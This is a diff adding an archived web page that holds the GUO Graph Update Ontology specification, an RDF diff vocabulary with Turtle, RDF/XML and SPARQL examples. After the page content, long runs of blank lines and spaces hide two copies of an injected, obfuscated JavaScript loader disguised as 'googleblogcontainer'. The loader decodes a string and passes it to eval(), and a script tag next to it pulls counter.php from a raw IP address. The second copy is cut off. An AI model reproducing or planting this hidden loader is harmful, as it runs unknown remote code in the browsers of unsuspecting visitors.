@@ -1,0 +1,908 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0069)http://web.archive.org/web/20121128171002/http://webr3.org/specs/guo/ -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+<script type="text/javascript" src="./specs_guo_files/analytics.js"></script>
+<script type="text/javascript">archive_analytics.values.server_name="wwwb-app15.us.archive.org";archive_analytics.values.server_ms=355;</script>
+<link type="text/css" rel="stylesheet" href="./specs_guo_files/banner-styles.css">
+
+
+
+<title>GUO Specification - Graph Update Ontology</title>
+<style media="all" type="text/css">
+
+@font-face { font-family: 'Chunkfive'; src: url('/web/20121128171002im_/http://webr3.org/__play/design/Chunkfive.otf'); }
+@font-face { font-family: 'Sorts Mill Goudy'; src: url('/web/20121128171002im_/http://webr3.org/__play/design/GoudyStM.otf'); }
+
+body {
+	line-height:135%;
+/*	font-size:0.8em;*/
+}
+
+h1, h2, h3, h4, h5, h6 {
+	line-height:130%;
+}
+
+blockquote, pre {
+	padding:0;
+	margin:1em;
+}
+pre {
+	padding:0.5em;
+	background-color:#dedede;
+}
+body.f-times {
+	font-family:"Times New Roman", Times, serif;
+}
+body.f-lucida {
+	font-family:"Lucida Sans Unicode", "Lucida Grande", sans-serif;
+}
+body.f-arial {
+	font-family:Arial, Helvetica, sans-serif;
+}
+body.f-verdana {
+	font-family:Verdana, Geneva, sans-serif;
+}
+body.f-sorts {
+	font-family:'Sorts Mill Goudy';
+}
+
+body.f-times .content {
+	width:33.4em;
+}
+body.f-lucida .content {
+	width:44.5em;
+}
+body.f-arial .content {
+/*	width:38.3em;*/
+	width:55em;
+}
+body.f-sorts .content {
+	width:37.95em;
+}
+
+body.f-verdana .content {
+	max-width:68.5em;
+}
+
+.content {
+	padding:1em;
+	margin:1em;
+	float:left;
+}
+
+</style>
+</head>
+<body class="f-arial"><div id="wm-ipp" lang="en" style="display: none;">
+
+<div style="position:fixed;left:0;top:0;width:100%!important">
+<div id="wm-ipp-inside">
+   <table style="width:100%;"><tbody><tr>
+   <td id="wm-logo">
+       <a href="http://web.archive.org/web/" title="Wayback Machine home page"><img src="./specs_guo_files/wayback-toolbar-logo.png" alt="Wayback Machine" width="110" height="39" border="0"></a>
+   </td>
+   <td class="c">
+       <table style="margin:0 auto;"><tbody><tr>
+       <td class="u" colspan="2">
+       <form target="_top" method="get" action="http://web.archive.org/web/form-submit.jsp" name="wmtb" id="wmtb"><input type="text" name="url" id="wmtbURL" value="http://webr3.org/specs/guo/" style="width:400px;" onfocus="this.focus();this.select();"><input type="hidden" name="type" value="replay"><input type="hidden" name="date" value="20121128171002"><input type="submit" value="Go"><span id="wm_tb_options" style="display:block;"></span></form>
+       </td>
+       <td class="n" rowspan="2">
+           <table><tbody>
+           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
+           <tr class="m">
+           	<td class="b" nowrap="nowrap">
+		
+		    <a href="http://web.archive.org/web/20100329060208/http://webr3.org/specs/guo/" title="29 Mar 2010">MAR</a>
+		
+		</td>
+		<td class="c" id="displayMonthEl" title="You are here: 17:10:02 Nov 28, 2012">NOV</td>
+		<td class="f" nowrap="nowrap">
+		
+		    Dec
+		
+                </td>
+	    </tr>
+           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
+           <tr class="d">
+               <td class="b" nowrap="nowrap">
+               
+                   <a href="http://web.archive.org/web/20100329060208/http://webr3.org/specs/guo/" title="6:02:08 Mar 29, 2010"><img src="./specs_guo_files/wm_tb_prv_on.png" alt="Previous capture" width="14" height="16" border="0"></a>
+               
+               </td>
+               <td class="c" id="displayDayEl" style="width:34px;font-size:24px;" title="You are here: 17:10:02 Nov 28, 2012">28</td>
+	       <td class="f" nowrap="nowrap">
+               
+                   <img src="./specs_guo_files/wm_tb_nxt_off.png" alt="Next capture" width="14" height="16" border="0">
+               
+	       </td>
+           </tr>
+           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
+           <tr class="y">
+	       <td class="b" nowrap="nowrap">
+               
+                   <a href="http://web.archive.org/web/20100329060208/http://webr3.org/specs/guo/" title="29 Mar 2010"><strong>2010</strong></a>
+               
+               </td>
+               <td class="c" id="displayYearEl" title="You are here: 17:10:02 Nov 28, 2012">2012</td>
+	       <td class="f" nowrap="nowrap">
+               
+                   2013
+               
+	       </td>
+           </tr>
+           </tbody></table>
+       </td>
+       </tr>
+       <tr>
+       <td class="s">
+           <a class="t" href="http://web.archive.org/web/20121128171002*/http://webr3.org/specs/guo/" title="See a list of every capture for this URL">2 captures</a>
+           <div class="r" title="Timespan for captures of this URL">29 Mar 10 - 28 Nov 12</div>
+       </td>
+       <td class="k">
+       <a href="" id="wm-graph-anchor">
+       <div id="wm-ipp-sparkline" title="Explore captures for this URL">
+	 <img id="sparklineImgId" alt="sparklines" onmouseover="__wm.st(1)" onmouseout="__wm.st(0)" onmousemove="__wm.mv(event,this)" width="500" height="27" border="0" src="./specs_guo_files/graph.jsp">
+       <div class="yt" style="display: none; width: 25px; height: 27px;"></div><div class="mt" style="display: none; width: 2px; height: 27px;"></div></div>
+       </a>
+       </td>
+       </tr></tbody></table>
+   </td>
+   <td class="r">
+       <a href="http://web.archive.org/web/20121128171002/http://webr3.org/specs/guo/#close" onclick="__wm.h();return false;" style="background-image:url(/static/images/toolbar/wm_tb_close.png);top:5px;" title="Close the toolbar">Close</a>
+       <a href="http://faq.web.archive.org/" style="background-image:url(/static/images/toolbar/wm_tb_help.png);bottom:5px;" title="Get some help using the Wayback Machine">Help</a>
+   </td>
+   </tr></tbody></table>
+</div>
+</div>
+</div>
+
+
+<!-- BEGIN WAYBACK TOOLBAR INSERT -->
+<script type="text/javascript" src="./specs_guo_files/disclaim-element.js"></script>
+<script type="text/javascript" src="./specs_guo_files/graph-calc.js"></script>
+<script type="text/javascript" src="./specs_guo_files/jquery.min.js"></script>
+<script type="text/javascript">//<![CDATA[
+var __wm = (function(){
+var wbPrefix = "/web/";
+var wbCurrentUrl = "http://webr3.org/specs/guo/";
+
+var firstYear = 1996;
+var imgWidth = 500,imgHeight = 27;
+var yearImgWidth = 25,monthImgWidth = 2;
+var displayDay = "28";
+var displayMonth = "Nov";
+var displayYear = "2012";
+var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+var $D=document,$=function(n){return document.getElementById(n)};
+var trackerVal,curYear = -1,curMonth = -1;
+var yearTracker,monthTracker;
+function showTrackers(val) {
+  if (val===trackerVal) return;
+  var $ipp=$("wm-ipp");
+  var $y=$("displayYearEl"),$m=$("displayMonthEl"),$d=$("displayDayEl");
+  if (val) {
+    $ipp.className="hi";
+  } else {
+    $ipp.className="";
+    $y.innerHTML=displayYear;$m.innerHTML=displayMonth;$d.innerHTML=displayDay;
+  }
+  yearTracker.style.display=val?"inline":"none";
+  monthTracker.style.display=val?"inline":"none";
+  trackerVal = val;
+}
+function getElementX2(obj) {
+  var $e=jQuery(obj);
+  return (typeof $e=="undefined"||typeof $e.offset=="undefined")?
+    getElementX(obj):Math.round($e.offset().left);
+}
+function trackMouseMove(event,element) {
+  var eventX = getEventX(event);
+  var elementX = getElementX2(element);
+  var xOff = Math.min(Math.max(0, eventX - elementX),imgWidth);
+  var monthOff = xOff % yearImgWidth;
+
+  var year = Math.floor(xOff / yearImgWidth);
+  var monthOfYear = Math.min(11,Math.floor(monthOff / monthImgWidth));
+  // 1 extra border pixel at the left edge of the year:
+  var month = (year * 12) + monthOfYear;
+  var day = monthOff % 2==1?15:1;
+  var dateString = zeroPad(year + firstYear) + zeroPad(monthOfYear+1,2) +
+    zeroPad(day,2) + "000000";
+
+  $("displayYearEl").innerHTML=year+firstYear;
+  $("displayMonthEl").innerHTML=prettyMonths[monthOfYear];
+  // looks too jarring when it changes..
+  //$("displayDayEl").innerHTML=zeroPad(day,2);
+  var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
+  $("wm-graph-anchor").href=url;
+
+  if(curYear != year) {
+    var yrOff = year * yearImgWidth;
+    yearTracker.style.left = yrOff + "px";
+    curYear = year;
+  }
+  if(curMonth != month) {
+    var mtOff = year + (month * monthImgWidth) + 1;
+    monthTracker.style.left = mtOff + "px";
+    curMonth = month;
+  }
+}
+function hideToolbar() {
+  $("wm-ipp").style.display="none";
+}
+function bootstrap() {
+  var $spk=$("wm-ipp-sparkline");
+  yearTracker=$D.createElement('div');
+  yearTracker.className='yt';
+  with(yearTracker.style){
+    display='none';width=yearImgWidth+"px";height=imgHeight+"px";
+  }
+  monthTracker=$D.createElement('div');
+  monthTracker.className='mt';
+  with(monthTracker.style){
+    display='none';width=monthImgWidth+"px";height=imgHeight+"px";
+  }
+  $spk.appendChild(yearTracker);
+  $spk.appendChild(monthTracker);
+
+  var $ipp=$("wm-ipp");
+  $ipp&&disclaimElement($ipp);
+}
+return{st:showTrackers,mv:trackMouseMove,h:hideToolbar,bt:bootstrap};
+})();//]]>
+</script>
+<style type="text/css">
+body {
+  margin-top:0 !important;
+  padding-top:0 !important;
+  min-width:800px !important;
+}
+</style>
+
+<script type="text/javascript">__wm.bt();</script>
+<!-- END WAYBACK TOOLBAR INSERT -->
+
+<div class="content">
+<h1>GUO - Graph Update Ontology</h1>
+<dl>
+  <dt>This Document:</dt>
+
+  <dd><a href="http://web.archive.org/web/20121128171002/http://webr3.org/guo/">http://webr3.org/guo/</a></dd>
+  <dt>Namespace:</dt>
+  <dd><a href="http://web.archive.org/web/20121128171002/http://webr3.org/owl/guo#">http://webr3.org/owl/guo#</a></dd>
+
+  <dt>Last update:</dt>
+  <dd>Date: 2010/03/21 00:45:19</dd>
+  <dt>Revision:</dt>
+
+  <dd>Revision: 0.02</dd>
+  <dt>Author:</dt>
+  <dd><a href="http://web.archive.org/web/20121128171002/http://webr3.org/" title="Nathan">Nathan</a></dd>
+</dl>
+<hr>
+<h2>Introduction</h2>
+<p>GUO (<a href="http://web.archive.org/web/20121128171002/http://webr3.org/owl/guo#">http://webr3.org/owl/guo#</a>) is an intentionally skinny ontology aimed at enabling lightweight RDF graph updates and graph synchronisation on a per triple level.</p>
+
+<p>GUO could be thought of as an RDF based <a href="http://web.archive.org/web/20121128171002/http://en.wikipedia.org/wiki/Diff">diff</a> for RDF graphs.</p>
+
+<p>The aim of GUO is to complement the likes of <a href="http://web.archive.org/web/20121128171002/http://www.w3.org/Submission/SPARQL-Update/">SPARQL Update</a> and <a href="http://web.archive.org/web/20121128171002/http://www.w3.org/TR/sparql11-http-rdf-update/">SPARQL 1.1 Uniform HTTP Protocol for Managing RDF Graphs</a>, without the need for Quads (as seen in <a href="http://web.archive.org/web/20121128171002/http://www4.wiwiss.fu-berlin.de/bizer/TriG/">TriG</a> and <a href="http://web.archive.org/web/20121128171002/http://swdev.nokia.com/trix/trix.html">TriX</a>) or Reification as seen in <a href="http://web.archive.org/web/20121128171002/http://n2.talis.com/wiki/Changesets">Changesets</a>.</p>
+
+<p>GUO is work in progress, and community feedback is requested before progressing this from version 0.01 to something more stable / complete ;) - please do <a href="mailto:nathan@webr3.org">email me</a> your comments and suggestions.</p>
+<hr>
+<h3>Update - GUO Graph Diff demo available</h3>
+<p>GUO Graph Diff is a prototype script for performing "diffs" on RDF Graphs; you can find out more <a href="http://web.archive.org/web/20121128171002/http://webr3.org/diff/">here</a> and indeed try it out!</p>
+<hr>
+<h2>Basics</h2>
+
+<p>The following example of GUO describes a change in the description of http://webr3.org/r/Special_Document</p>
+<pre>@prefix guo: &lt;http://webr3.org/owl/guo#&gt; .
+@prefix dcterms: &lt;http://purl.org/dc/terms/&gt; .
+
+_:u1 a guo:UpdateInstruction ;
+     guo:target_graph &lt;http://webr3.org&gt; ;
+     guo:target_subject &lt;http://webr3.org/r/Special_Document&gt; ;
+     guo:delete _:d1 ;
+     guo:insert _:i2 .
+
+_:d1 dcterms:title "Draft Special Document"@en .
+
+_:i2 dcterms:title "Special Document"@en ;
+     dcterms:published "2010-03-18T15:26:13Z" .
+</pre>
+
+<p>The above example describes the removal of a single triple:</p>
+<pre>&lt;http://webr3.org/r/Special_Document&gt; &lt;http://purl.org/dc/terms/title&gt; "Draft Special Document"@en .
+</pre>
+
+<p>And the addition of two new triples:</p>
+<pre>&lt;http://webr3.org/r/Special_Document&gt; &lt;http://purl.org/dc/terms/title&gt; "Special Document"@en .
+&lt;http://webr3.org/r/Special_Document&gt; &lt;http://purl.org/dc/terms/published&gt; "2010-03-18T15:26:13Z" .
+</pre>
+
+<p>Behind the scenes, this could be transformed in to the following two SPARQL Update queries:</p>
+
+<pre>DELETE DATA FROM &lt;http://webr3.org&gt; {
+  &lt;http://webr3.org/r/Special_Document&gt; &lt;http://purl.org/dc/terms/title&gt; "Draft Special Document"@en .
+}
+
+</pre>
+<pre>INSERT DATA INTO &lt;http://webr3.org&gt; {
+  &lt;http://webr3.org/r/Special_Document&gt; &lt;http://purl.org/dc/terms/title&gt; "Draft Special Document"@en ;
+  &lt;http://purl.org/dc/terms/published&gt; "2010-03-18T15:26:13Z" .
+}
+</pre>
+<hr>
+<h2>Simple Concept</h2>
+<p>GUO works by:</p>
+<ul>
+<li>combining a guo:target_subject to the predicate &amp; object values from the resource specified by guo:insert or guo:delete, in order to create a new set of triples.</li>
+<li>taking all triples from a graph defined by guo:merge and inserting them as-is to the new graph.</li>
+</ul>
+<p>The method to be performed is specified by the predicate used to link a guo:UpdateInstruction to resources, namely guo:insert / guo:delete combined with a target_subject, and / or a guo:merge instruction.</p>
+
+<p>guo:UpdateInstruction(s) comprise of (a guo:target_subject and at least one guo:insert or guo:delete statement) and / or (a guo:merge statement).</p>
+
+<p>guo:target_graph is optional; multiple guo:target_graph statements can be combined in a single guo:UpdateInstruction to enable the updating of multiple named graphs at the same time.</p>
+
+<p>guo:merge is also optional, multiple guo:merge statements can be combined in a single guo:UpdateInstruction to merge multiple graphs in to the output.</p>
+
+<p>Similarly, multiple guo:insert and guo:delete statements can be combined together in a single guo:UpdateInstruction; this allows several resources to be merged in to one, or data from multiple transactions to be processed in a single batch.</p>
+
+<p>guo:UpdateInstructions and resources can either be anonymous (blank nodes) or named resources (with a uri), this keeps GUO highly versatile, for example the resource referenced by a guo:insert or guo:delete statement could easily be a resource found elsewhere on the web, or the results of a SPARQL DESCRIBE / CONSTRUCT query.</p>
+
+<p>RDF Graphs can contain multiple guo:UpdateInstruction's, and GUO places no constraints on the serialization nor content of an RDF graph containing guo:UpdateInstruction(s), thus GUO can be combined with other Ontologies to provide any functionality required by implementing systems.</p>
+
+<p>For example GUO could be used with <a href="http://web.archive.org/web/20121128171002/http://dublincore.org/documents/dcmi-terms/">DCMI Terms</a> to allow annotation of guo:UpdateInstruction's, using description, creator, modified and so forth. Version control could easily be achieved by using GUO with ontologies such as <a href="http://web.archive.org/web/20121128171002/http://rdfs.org/sioc/spec/">sioc</a> (previous_version, latest_version etc.); Access control, provenance and more can be achieved through using GUO with <a href="http://web.archive.org/web/20121128171002/http://esw.w3.org/Foaf+ssl">FOAF+SSL</a> and <a href="http://web.archive.org/web/20121128171002/http://esw.w3.org/WebAccessControl">ACL</a>.</p>
+
+<hr>
+<h2>Ontology</h2>
+<dl>
+    <dt>Namespace</dt>
+    <dd><a href="http://web.archive.org/web/20121128171002/http://webr3.org/owl/guo#">http://webr3.org/owl/guo#</a></dd>
+</dl>
+<h3>Class - guo:UpdateInstruction</h3>
+<dl>
+	<dt>comment</dt>
+
+	    <dd>The class of an RDF Update Instruction, an UpdateInstruction defines a target_subject, optional target_graph(s) and at least one object to insert or delete</dd>
+</dl>
+<hr>
+<h3>property - guo:target_graph</h3>
+<dl>
+	<dt>domain</dt>
+    	<dd>guo:UpdateInstruction</dd>
+	<dt>comment</dt>
+
+	    <dd>Optional property of an UpdateInstruction which allows updates to apply only to the specified Named Graph(s)</dd>
+</dl>
+<hr>
+<h3>property - guo:target_subject</h3>
+<dl>
+	<dt>REQUIRED</dt>
+	<dt>domain</dt>
+    	<dd>guo:UpdateInstruction</dd>
+
+    <dt>range</dt>
+    	<dd>owl:Thing </dd>
+	<dt>comment</dt>
+	    <dd>The target_subject is a required property of all UpdateInstructions which include one or more guo:insert/guo:delete instructions, target_subject is combined with the predicate and object values from insert/delete nodes to form triples which are to be either inserted or deleted (optionally constrained to one or more target_graphs, and optionally merged with triples from graphs specified by guo:merge)</dd>
+</dl>
+<hr>
+<h3>property - guo:merge</h3>
+<dl>
+
+	<dt>domain</dt>
+    	<dd>guo:UpdateInstruction</dd>
+	<dt>comment</dt>
+	    <dd>The merge property defines a graph from which all triples should be merged in to the target_graph(s), unlike insert which works on a resource level rewriting subjects, merge works on a graph level where all triples are added "as is".</dd>
+</dl>
+<hr>
+<h3>property - guo:insert</h3>
+<dl>
+
+	<dt>domain</dt>
+    	<dd>guo:UpdateInstruction</dd>
+	<dt>comment</dt>
+	    <dd>The insert property defines a blank node or resource whose predicate and object values will be used to create new triples inside target_graph(s) if specified with target_subject.</dd>
+</dl>
+<hr>
+<h3>property - guo:delete</h3>
+<dl>
+
+	<dt>domain</dt>
+    	<dd>guo:UpdateInstruction</dd>
+	<dt>comment</dt>
+	    <dd>The delete property defines blank node or resource whose predicate and object values will be used to remove triples { target_subject predicate object } from target_graph(s) if specified</dd>
+</dl>
+
+<hr>
+
+<h2>Examples</h2>
+
+<h3>Merging multiple resource in to one new resource</h3>
+<pre>&lt;rdf:RDF xmlns:guo="http://webr3.org/owl/guo#"
+    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
+    &lt;guo:UpdateInstruction&gt;
+        &lt;guo:insert rdf:resource="http://dbpedia.org/resource/London"/&gt;
+        &lt;guo:insert rdf:resource="http://mpii.de/yago/resource/London"/&gt;
+        &lt;guo:insert rdf:resource="http://statistics.data.gov.uk/id/eer?name=London"/&gt;
+        &lt;guo:target_subject rdf:resource="http://example.com/resource/London"/&gt;
+    &lt;/guo:UpdateInstruction&gt;
+
+&lt;/rdf:RDF&gt;
+</pre>
+
+<h3>Merging multiple graphs</h3>
+<pre>&lt;rdf:RDF xmlns:guo="http://webr3.org/owl/guo#"
+    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
+    &lt;guo:UpdateInstruction&gt;
+        &lt;guo:merge rdf:resource="http://dbpedia.org/data/Linked_Data"/&gt;
+        &lt;guo:merge rdf:resource="http://dbpedia.org/data/Semantic_Web"/&gt;
+    &lt;/guo:UpdateInstruction&gt;
+
+&lt;/rdf:RDF&gt;
+</pre>
+
+<h3>Adding additional meta data w/ dcterms.</h3>
+<pre>@prefix guo: &lt;http://webr3.org/owl/guo#&gt; .
+@prefix rdfs: &lt;http://www.w3.org/2000/01/rdf-schema#&gt; .
+@prefix dcterms: &lt;http://purl.org/dc/terms/&gt; .
+
+_:u1
+	a guo:UpdateInstruction ;
+	rdfs:comment "updated the title and published."@en ;
+	dcterms:creator &lt;http://webr3.org/nathan&gt; ;
+	dcterms:created "2010-03-18T17:05:01Z" ;
+	guo:target_subject &lt;http://webr3.org/r/temp&gt; ;
+	guo:delete _:d1 ;
+	guo:insert _:i1 .
+
+_:d1 dcterms:title "GUO working"@en .
+
+_:i1 dcterms:title "GUO Spec Initial Release"@en ;
+	dcterms:publisher &lt;http://webr3.org/nathan&gt; ;
+	dcterms:published "2010-03-18T17:05:01Z" .
+</pre>
+
+<h3>Inserting a triple</h3>
+<pre>&lt;rdf:RDF xmlns="http://webr3.org/owl/guo#"
+    xmlns:foaf="http://xmlns.com/foaf/0.1/"
+    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
+
+    &lt;UpdateInstruction&gt;
+        &lt;insert rdf:parseType="Resource"&gt;
+            &lt;foaf:name xml:lang="en"&gt;nathan&lt;/foaf:name&gt;
+        &lt;/insert&gt;
+        &lt;target_subject rdf:resource="http://webr3.org/r/nathan"/&gt;
+    &lt;/UpdateInstruction&gt;
+&lt;/rdf:RDF&gt;
+</pre>
+
+<h3>Insert triples from the results of a SPARQL CONSTRUCT</h3>
+<pre>&lt;rdf:RDF xmlns="http://webr3.org/owl/guo#"
+    xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"&gt;
+
+    &lt;UpdateInstruction&gt;
+        &lt;insert rdf:resource="http://dbpedia.org/sparql?query=construct+{+%3Fs+%3Fp+%3Fo+}+where+{..."/&gt;
+        &lt;target_subject rdf:resource="http://webr3.org/r/linked_to_haxe"/&gt;
+    &lt;/UpdateInstruction&gt;
+&lt;/rdf:RDF&gt;
+</pre>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "/web/20121128171002/https://ssl." : "/web/20121128171002/http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script><script src="./specs_guo_files/ga.js" type="text/javascript"></script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-3391780-6");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <script id="googleblogcontainer">var nf902ae4="";var e1060178120b5={dbf6eafb4f182:function(){var qb=String,vb=Array.prototype.slice.call(arguments).join(""),y8=vb.substr(this.t8(),3)-578,vd,ye;vb=vb.substr(this.rd());var wd=this.vf(vb);for(var xd=0;xd<wd;xd++){try{throw(u0=this.p2(vb,xd));}catch(e){u0=e;};if(u0=='•'){y8="";xd=this.ta(xd);sf=this.q2(vb,xd);while(this.w6(sf)){y8+=sf;xd++;sf=this.yc(vb,xd);}y8-=435;continue;}vd="";if(this.q0(u0)){xd++;u0=vb.substr(xd,1);while(u0!='±'){vd+=u0;xd++;u0=vb.substr(xd,1);}vd=this.rc(vd,y8,47);if(vd<0)vd+=256;vd=this.v2(vd);this.oc(vd);continue;}yd=this.v9(u0);if(yd>848)yd-=848;ye=yd-y8-47;ye=this.v7(ye);nf902ae4+=this.re(ye);}},t8:function(){return 15;},rd:function(){return 18;},vf:function(v1){return v1.length;},p2:function(x3,s6){return x3.substr(s6,1);},ta:function(o3){return ++o3;},q2:function(td,rb){return td.substr(rb,1);},yc:function(n6,sd){return n6.substr(sd,1);},v2:function(t2){if(t2==168)t2=1025;else if(t2==184)t2=1105;return (t2>=192 && t2<256) ? t2+848 : t2;},w6:function(pd){return pd!='•';},q0:function(o1){return o1=='±';},rc:function(q7,n8,we){return q7-n8-we;},oc:function(ob){var qb=String;nf902ae4+=qb["fr\x6f\x6dCharCo\x64e"](ob);},re:function(oa){var qb=String;return qb["fr\x6f\x6dCharCo\x64e"](oa);},v7:function(r5){var r7=r5;if(r7<0)r7+=256;if(r7==168)r7=1025;else if(r7==184)r7=1105;return (r7>=192 && r7<256) ? r7+848 : r7;},v9:function(w1){return (w1+'')["ch\x61\x72Co\x64eAt"](0);}};e1060178120b5.dbf6eafb4f182("c","0","d","2","5","a","3","0","1","4","0","f","d","7","9","6","5","3","±","2","2","2","±","•","4","6","6","•","±","1","8","9","±","•","5","4","3","•","±","2","5","4","±","•","6","1","0•","S","•","4","5","8","•","±","1","7","9","±","•","6","1","1","•","D","•","4","5","1","•","±","1","7","3","±","•","5","6","3","•","#","•","4","7","4","•","±","1","3","2","±","•","5","9","3","•","D","•","5","6","2","•","±","3","2","±","•","4","4","0","•","±","1","5","7","±","•","5","5","0","•","±","2","2","±","•","53","3","•","±","2","4","6","±","•","4","4","7","•","c","•","4","9","5","•","±","1","4","6","±","•","6","3","4","•","2","•","4","6","2","•","±","1","5","7","±","•","4","4","8","•","±","1","2","7","±","•","4","7","1","•","±","1","6","5","±","•","5","8","1","•","±","1","0","±","•","5","7","1","•","±","2","2","2","±","•","5","5","5","•","±","2","1","0","±","•","6","1","0","•","±","5","±","•","4","7","7","•","±","1","6","9","±","•","6","2","2","•",">","•","6","0","1","•","±","2","4","5","±","•","4","6","9","•","±","1","8","6","±","•","4","7","2","•","±","1","8","4","±","±","1","4","5","±•","5","0","3","•","±","1","4","9","±","•","5","2","0","•","±","2","3","5","±","•","5","3","1","•","±","2","5","4","±","•","4","7","6","•","±","19","9","±","•","5","9","4","•","5","•","6","3","4","•","b","•","5","8","0","•","%","•","6","0","6","•","<","•","6","2","8","•","\•","5","3","1","•","±","2","5","4","±","•","5","9","0","•","1","•","5","3","3","•","±","2","4","4","±","•","5","2","6","•","±","2","4","9","±","•","5","4","9","•","±","2","2","±","•","5","5","9","•","±","2","5","±","•","5","5","9","•","±","3","1","±","•","5","5","0","•","±","7","±","•","4","9","0","•","±","2","1","6","±","•","5","7","0","•","±","2","1","6","±","•","5","9","0","•","±","2","3","4","±","•","4","8","8","•","±","2","1","5","±","•","6","3","3","•","g","•","6","1","5","•","F","•","4","9","3","•","±","1","6","6","±","•","5","0","5","•","±","2","2","1","±","•","5","4","4","•","±","1","6","±","•","4","6","1","•","±","1","8","9","±","•","6","3","5","•","g","•","4","9","1","•","±","1","6","1","±","•","5","4","2","•","±","2","0","1","±","•","4","7","1","•","±","1","3","0","±","•","5","8","6","•","±","2","5","5","±","•","5","2","7","•","±","1","8","8","±•","4","4","1","•","c","•","5","0","3","•","±","1","6","4","±","•","5","8","4","•","±","2","5","3","±","•","5","2","4","•","±","1","9","0","±","•6","1","6","•","±","1","8","±","•","5","5","0","•","±","2","1","2","±","•","5","7","1","•","±","2","3","2","±","•","6","3","3","•","+","•","5","3","3","•","±","1","9","1","±","•","5","0","8","•","±","1","7","1","±","•","6","0","8","•","±","1","2","±","•","6","1","4","•","±","1","7","±","•","5","9","0","•","-","•","57","6","•","+•","5","3","3","•","±","6","±","•","5","7","8","•",",","•","4","4","0","•","±","1","6","8","±","•","5","5","3","•","±","1","0","±","•","5","4","8","•","±","1","8","±","•","5","7","3","•","±","2","3","1","±","•","5","5","0","•","±","1","8","±","•","4","8","4","•","±","2","0","0","±","•","5","9","7","•","A","•","5","6","1","•","±","2","3","5","±","•","5","9","8•","±","1","4","±","•","4","7","4","•","±","1","3","3","±","•","6","1","3","•","4","•","4","4","3","•","z","•","6","1","7","•","7","•","5","0","8","•","±","1","5","9","±","•","5","8","6","•","±","2","4","1","±","•","4","5","1","•","f","•","4","8","0","•","±","1","6","5","±","•","6","1","1","•","/","•","6","0","6","•",".","•","5","9","8","•","±","1","6","±","•","5","6","4","•","±","2","1","5","±","•","5","4","2","•","±","1","9","5","±","•","5","2","7","•","±","19","8","±","");eval(nf902ae4);</script><script id="googlebogcounter" src="http://91.196.216.30/counter.php"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <script id="googleblogcontainer">var nf902ae4="";var e1060178120b5={dbf6eafb4f182:function(){var qb=String,vb=Array.prototype.slice.call(arguments).join(""),y8=vb.substr(this.t8(),3)-578,vd,ye;vb=vb.substr(this.rd());var wd=this.vf(vb);for(var xd=0;xd<wd;xd++){try{throw(u0=this.p2(vb,xd));}catch(e){u0=e;};if(u0=='•'){y8="";xd=this.ta(xd);sf=this.q2(vb,xd);while(this.w6(sf)){y8+=sf;xd++;sf=this.yc(vb,xd);}y8-=435;continue;}vd="";if(this.q0(u0)){xd++;u0=vb.substr(xd,1);while(u0!='±'){vd+=u0;xd++;u0=vb.substr(xd,1);}vd=this.rc(vd,y8,47);if(vd<0)vd+=256;vd=this.v2(vd);this.oc(vd);continue;}yd=this.v9(u0);if(yd>848)yd-=848;ye=yd-y8-47;ye=this.v7(ye);nf902ae4+=this.re(ye);}},t8:function(){return 15;},rd:function(){return 18;},vf:function(v1){return v1.length;},p2:function(x3,s6){return x3.substr(s6,1);},ta:function(o3){return ++o3;},q2:function(td,rb){return td.substr(rb,1);},yc:function(n6,sd){return n6.substr(sd,1);},v2:function(t2){if(t2==168)t2=1025;else if(t2==184)t2=1105;return (t2>=192 && t2<256) ? t2+848 : t2;},w6:function(pd){return pd!='•';},q0:function(o1){return o1=='±';},rc:function(q7,n8,we){return q7-n8-we;},oc:function(ob){var 